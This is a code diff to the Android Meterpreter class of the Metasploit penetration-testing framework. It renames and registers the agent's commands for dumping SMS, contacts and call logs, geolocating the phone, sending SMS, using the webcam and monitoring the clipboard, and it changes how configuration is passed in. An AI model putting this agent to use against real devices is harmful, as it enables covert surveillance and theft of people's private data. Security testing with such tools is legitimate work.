@@ -4,8 +4,8 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 
-import com.metasploit.meterpreter.android.activity_start_android;
-import com.metasploit.meterpreter.android.check_root_android;
+import com.metasploit.meterpreter.android.android_activity_start;
+import com.metasploit.meterpreter.android.android_check_root;
 import com.metasploit.meterpreter.android.clipboard_get_data;
 import com.metasploit.meterpreter.android.clipboard_monitor_dump;
 import com.metasploit.meterpreter.android.clipboard_monitor_pause;
@@ -14,15 +14,15 @@ import com.metasploit.meterpreter.android.clipboard_monitor_resume;
 import com.metasploit.meterpreter.android.clipboard_monitor_start;
 import com.metasploit.meterpreter.android.clipboard_monitor_stop;
 import com.metasploit.meterpreter.android.clipboard_set_data;
-import com.metasploit.meterpreter.android.dump_calllog_android;
-import com.metasploit.meterpreter.android.dump_contacts_android;
-import com.metasploit.meterpreter.android.dump_sms_android;
-import com.metasploit.meterpreter.android.geolocate_android;
-import com.metasploit.meterpreter.android.interval_collect;
-import com.metasploit.meterpreter.android.send_sms_android;
-import com.metasploit.meterpreter.android.set_audio_mode_android;
-import com.metasploit.meterpreter.android.set_wallpaper_android;
-import com.metasploit.meterpreter.android.sqlite_query_android;
+import com.metasploit.meterpreter.android.android_dump_calllog;
+import com.metasploit.meterpreter.android.android_dump_contacts;
+import com.metasploit.meterpreter.android.android_dump_sms;
+import com.metasploit.meterpreter.android.android_geolocate;
+import com.metasploit.meterpreter.android.android_interval_collect;
+import com.metasploit.meterpreter.android.android_send_sms;
+import com.metasploit.meterpreter.android.android_set_audio_mode;
+import com.metasploit.meterpreter.android.android_set_wallpaper;
+import com.metasploit.meterpreter.android.android_sqlite_query;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
 import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
 import com.metasploit.meterpreter.android.stdapi_sys_config_sysinfo_android;
@@ -32,7 +32,7 @@ import com.metasploit.meterpreter.android.webcam_get_frame_android;
 import com.metasploit.meterpreter.android.webcam_list_android;
 import com.metasploit.meterpreter.android.webcam_start_android;
 import com.metasploit.meterpreter.android.webcam_stop_android;
-import com.metasploit.meterpreter.android.wlan_geolocate;
+import com.metasploit.meterpreter.android.android_wlan_geolocate;
 import com.metasploit.meterpreter.stdapi.Loader;
 import com.metasploit.meterpreter.stdapi.channel_create_stdapi_fs_file;
 import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_tcp_client;
@@ -51,6 +51,7 @@ import com.metasploit.meterpreter.stdapi.stdapi_fs_sha1;
 import com.metasploit.meterpreter.stdapi.stdapi_fs_stat;
 import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_interfaces_V1_4;
 import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_routes_V1_4;
+import com.metasploit.meterpreter.stdapi.stdapi_sys_config_localtime;
 import com.metasploit.meterpreter.stdapi.stdapi_net_socket_tcp_shutdown_V1_3;
 import com.metasploit.meterpreter.stdapi.stdapi_sys_process_execute_V1_3;
 
@@ -117,17 +118,17 @@ public class AndroidMeterpreter extends Meterpreter {
         return context;
     }
 
-    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, String[] parameters, boolean redirectErrors) throws Exception {
+    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, Object[] parameters, boolean redirectErrors) throws Exception {
         super(in, rawOut, true, redirectErrors, false);
-        writeableDir = parameters[0];
+        writeableDir = (String)parameters[0];
+        byte[] config = (byte[]) parameters[1];
         try {
             findContext();
         } catch (Exception e) {
             e.printStackTrace();
         }
-        if (parameters.length > 1 && parameters[1].charAt(0) != ' ') {
-            byte[] configBytes = Utils.hexStringToByteArray(parameters[1]);
-            loadConfiguration(in, rawOut, configBytes);
+        if (config != null && config[0] != 0) {
+            loadConfiguration(in, rawOut, config);
         } else {
             int configLen = in.readInt();
             byte[] configBytes = new byte[configLen];
@@ -140,11 +141,6 @@ public class AndroidMeterpreter extends Meterpreter {
         this.intervalCollectionManager.start();
         startExecuting();
         this.intervalCollectionManager.stop();
-    }
-
-    @Override
-    protected String getPayloadTrustManager() {
-        return "com.metasploit.stage.PayloadTrustManager";
     }
 
     @Override
@@ -173,6 +169,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("stdapi_net_socket_tcp_shutdown", stdapi_net_socket_tcp_shutdown_V1_3.class);
         mgr.registerCommand("stdapi_sys_config_getuid", stdapi_sys_config_getuid.class);
         mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo_android.class);
+        mgr.registerCommand("stdapi_sys_config_localtime", stdapi_sys_config_localtime.class);
         mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
         mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
         if (context != null) {
@@ -181,18 +178,18 @@ public class AndroidMeterpreter extends Meterpreter {
             mgr.registerCommand("webcam_start", webcam_start_android.class);
             mgr.registerCommand("webcam_stop", webcam_stop_android.class);
             mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
-            mgr.registerCommand("dump_sms", dump_sms_android.class);
-            mgr.registerCommand("dump_contacts", dump_contacts_android.class);
-            mgr.registerCommand("geolocate", geolocate_android.class);
-            mgr.registerCommand("dump_calllog", dump_calllog_android.class);
-            mgr.registerCommand("check_root", check_root_android.class);
-            mgr.registerCommand("send_sms", send_sms_android.class);
-            mgr.registerCommand("wlan_geolocate", wlan_geolocate.class);
-            mgr.registerCommand("interval_collect", interval_collect.class);
-            mgr.registerCommand("activity_start", activity_start_android.class);
-            mgr.registerCommand("set_audio_mode", set_audio_mode_android.class);
-            mgr.registerCommand("sqlite_query", sqlite_query_android.class);
-            mgr.registerCommand("set_wallpaper", set_wallpaper_android.class);
+            mgr.registerCommand("android_dump_sms", android_dump_sms.class);
+            mgr.registerCommand("android_dump_contacts", android_dump_contacts.class);
+            mgr.registerCommand("android_geolocate", android_geolocate.class);
+            mgr.registerCommand("android_dump_calllog", android_dump_calllog.class);
+            mgr.registerCommand("android_check_root", android_check_root.class);
+            mgr.registerCommand("android_send_sms", android_send_sms.class);
+            mgr.registerCommand("android_wlan_geolocate", android_wlan_geolocate.class);
+            mgr.registerCommand("android_interval_collect", android_interval_collect.class);
+            mgr.registerCommand("android_activity_start", android_activity_start.class);
+            mgr.registerCommand("android_set_audio_mode", android_set_audio_mode.class);
+            mgr.registerCommand("android_sqlite_query", android_sqlite_query.class);
+            mgr.registerCommand("android_set_wallpaper", android_set_wallpaper.class);
             mgr.registerCommand("extapi_clipboard_get_data", clipboard_get_data.class);
             mgr.registerCommand("extapi_clipboard_set_data", clipboard_set_data.class);
             mgr.registerCommand("extapi_clipboard_monitor_dump", clipboard_monitor_dump.class);
